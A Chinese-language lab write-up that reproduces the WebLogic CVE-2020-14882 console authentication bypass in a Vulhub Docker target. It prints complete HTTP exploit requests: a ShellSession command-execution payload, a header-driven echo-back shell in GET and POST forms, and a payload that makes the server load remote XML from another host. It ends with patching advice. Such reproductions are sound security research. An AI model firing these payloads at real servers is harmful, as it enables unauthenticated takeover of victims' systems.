# 0x00漏洞简述

2020年10月30日， Oracle 官方的 CVE-2020-14882 Weblogic 代码执行漏洞 最新补丁可被绕过，该漏洞编号为
CVE-2020-14882 ，漏洞等级： 严重 ，漏洞评分： 9.8 。

远程攻击者可以构造特殊的 HTTP 请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server
Console 执行任意代码。

# 0x01影响版本

> Oracle Weblogic Server 10.3.6.0.0
>
> Oracle Weblogic Server 12.1.3.0.0
>
> Oracle Weblogic Server 12.2.1.3.0
>
> Oracle Weblogic Server 12.2.1.4.0
>
> Oracle Weblogic Server 14.1.1.0.0

# 0x02漏洞复现

虚拟机部署docker安装Vulhub一键搭建漏洞测试靶场环境。

> docker-compose up -d

![1604366631_5fa0b127c0a412c64b90e.png!small](https://image.3001.net/images/20201103/1604366631_5fa0b127c0a412c64b90e.png!small)

  * 访问漏洞环境

> http://192.168.60.130:7001/

![1604366642_5fa0b132b6158ea34c5d4.png!small](https://image.3001.net/images/20201103/1604366642_5fa0b132b6158ea34c5d4.png!small)

  * 在漏洞利用时根据不同需求进行Pyload构造。目前有常用的三种：

### 1、执行payload后不回显，但是已经执行成功。

构造payload执行：

> GET
> /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/yunzui');")
> HTTP/1.1  
> Host: 192.168.60.130:7001  
> Cache-Control: max-age=0  
> DNT: 1  
> Upgrade-Insecure-Requests: 1  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
> like Gecko) Chrome/86.0.4240.75 Safari/537.36  
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.9  
> Referer: http://192.168.60.130:7001/console/  
> Accept-Encoding: gzip, deflate  
> Accept-Language: zh-CN,zh;q=0.9  
> Cookie:
> ADMINCONSOLESESSION=-KSLiFfIosk7pDYFYp701K0Svy9__G8yZefB7whwyLGLvkhjKbTD!-355433482  
> Connection: close  
> Content-Length: 4

![1604366675_5fa0b153168e66a61ea7b.png!small](https://image.3001.net/images/20201103/1604366675_5fa0b153168e66a61ea7b.png!small)

效果查看

![1604366689_5fa0b1610a2c1dd606283.png!small](https://image.3001.net/images/20201103/1604366689_5fa0b1610a2c1dd606283.png!small)

或者使用dnslog平台进行验证

生成DNS域名：idvek9.dnslog.cn

![1604366709_5fa0b175beaf8923d3525.png!small](https://image.3001.net/images/20201103/1604366709_5fa0b175beaf8923d3525.png!small)

构造payload进行执行

![1604366744_5fa0b198d911b13512d79.png!small](https://image.3001.net/images/20201103/1604366744_5fa0b198d911b13512d79.png!small)

效果查看

![1604366760_5fa0b1a8b9d327b3ac746.png!small](https://image.3001.net/images/20201103/1604366760_5fa0b1a8b9d327b3ac746.png!small)

或者使用python脚本进行漏洞利用

![1604366772_5fa0b1b4e1a02237b87d3.png!small](https://image.3001.net/images/20201103/1604366772_5fa0b1b4e1a02237b87d3.png!small)

效果查看

![1604366783_5fa0b1bf12c3d0c3f61af.png!small](https://image.3001.net/images/20201103/1604366783_5fa0b1bf12c3d0c3f61af.png!small)

### 2、执行payload后回显

通过GET方式进行payload提交

> GET
> /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread
> currentThread = (weblogic.work.ExecuteThread)Thread.currentThread();
> weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork();
> java.lang.reflect.Field field =
> adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object
> obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req =
> (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj);
> String cmd = req.getHeader("cmd");String[] cmds =
> System.getProperty("os.name").toLowerCase().contains("window") ? new
> String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd
> != null ){ String result = new java.util.Scanner(new
> java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\A").next();
> weblogic.servlet.internal.ServletResponseImpl res =
> (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new
> weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}
> currentThread.interrupt();') HTTP/1.1
>
> Host: 192.168.60.130:7001
>
> Upgrade-Insecure-Requests: 1
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
>
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.9
>
> Accept-Encoding: gzip, deflate
>
> Accept-Language: zh-CN,zh;q=0.9
>
> Connection: close
>
> cmd:id
>
> Content-Length: 0
>
> 执行：id

![1604366800_5fa0b1d05c63bb08dd4ac.png!small](https://image.3001.net/images/20201103/1604366800_5fa0b1d05c63bb08dd4ac.png!small)

通过POST方式进行payload提交

> POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
>
> Host: 192.168.60.130:7001
>
> cmd: id
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
>
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.9
>
> Accept-Encoding: gzip, deflate
>
> Accept-Language: zh-CN,zh;q=0.9
>
> Connection: close
>
> Content-Type: application/x-www-form-urlencoded
>
> Content-Length: 1258
>
>
> _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread
> executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
>
> weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
>
> java.lang.reflect.Field field =
> adapter.getClass().getDeclaredField("connectionHandler");
>
> field.setAccessible(true);
>
> Object obj = field.get(adapter);
>
> weblogic.servlet.internal.ServletRequestImpl req =
> (weblogic.servlet.internal.ServletRequestImpl)
> obj.getClass().getMethod("getServletRequest").invoke(obj);
>
> String cmd = req.getHeader("cmd");
>
> String[] cmds =
> System.getProperty("os.name").toLowerCase().contains("window") ? new
> String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
>
> if (cmd != null) {
>
> String result = new
> java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\A").next();
>
> weblogic.servlet.internal.ServletResponseImpl res =
> (weblogic.servlet.internal.ServletResponseImpl)
> req.getClass().getMethod("getResponse").invoke(req);
>
> res.getServletOutputStream().writeStream(new
> weblogic.xml.util.StringInputStream(result));
>
> res.getServletOutputStream().flush();
>
> res.getWriter().write("");
>
> }executeThread.interrupt();
>
> ");
>
> 执行：id

![1604366819_5fa0b1e34f5c5193f5142.png!small](https://image.3001.net/images/20201103/1604366819_5fa0b1e34f5c5193f5142.png!small)

### 3、通过把payload构造为XML格式进行引用

![1604366833_5fa0b1f13d1db1ff1c6c2.png!small](https://image.3001.net/images/20201103/1604366833_5fa0b1f13d1db1ff1c6c2.png!small)

通过DNSLog平台生成域名：bq11vi.dnslog.cn

![1604366844_5fa0b1fc50f61f647620f.png!small](https://image.3001.net/images/20201103/1604366844_5fa0b1fc50f61f647620f.png!small)

执行（GET）

> GET
> /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.60.1/weblogic.xml")
> HTTP/1.1
>
> Host: 192.168.60.130:7001
>
> Cache-Control: max-age=0
>
> DNT: 1
>
> Upgrade-Insecure-Requests: 1
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
> like Gecko) Chrome/86.0.4240.75 Safari/537.36
>
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.9
>
> Referer: http://192.168.60.130:7001/console/
>
> Accept-Encoding: gzip, deflate
>
> Accept-Language: zh-CN,zh;q=0.9
>
> Cookie:
> ADMINCONSOLESESSION=-KSLiFfIosk7pDYFYp701K0Svy9__G8yZefB7whwyLGLvkhjKbTD!-355433482
>
> Connection: close

![1604366864_5fa0b21093fb405ec1f3c.png!small](https://image.3001.net/images/20201103/1604366864_5fa0b21093fb405ec1f3c.png!small)

效果查看

![1604366873_5fa0b219ed4f791896eda.png!small](https://image.3001.net/images/20201103/1604366873_5fa0b219ed4f791896eda.png!small)

执行（POST）

> POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
>
> Host: 192.168.60.130:7001
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
>
> Accept-Encoding: gzip, deflate
>
> Accept: */*
>
> Connection: keep-alive
>
> Content-type: application/x-www-form-urlencoded; charset=utf-8
>
> Content-Length: 153
>
> CMD:whoami
>
>
> _nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.60.1/weblogic.xml")

![1604366889_5fa0b22966b25bdd59940.png!small](https://image.3001.net/images/20201103/1604366889_5fa0b22966b25bdd59940.png!small)

效果查看

![1604366900_5fa0b2340336977d8f2c4.png!small](https://image.3001.net/images/20201103/1604366900_5fa0b2340336977d8f2c4.png!small)

# 0x03修复建议

> 建议用户及时将 Weblogic 后台 /console/console.portal 对外的访问权限暂时关闭。
>
> 此次 Oracle 官方的 CPU已发布了针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。

注：Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆https://support.oracle.com后，可以下载最新补丁。

# 0x04参考链接

> <https://www.safedog.cn/news.html?id=4533>
>
> <http://blog.nsfocus.net/weblogic-console-http-1028/>
>
> <https://leaderzhang.com/>

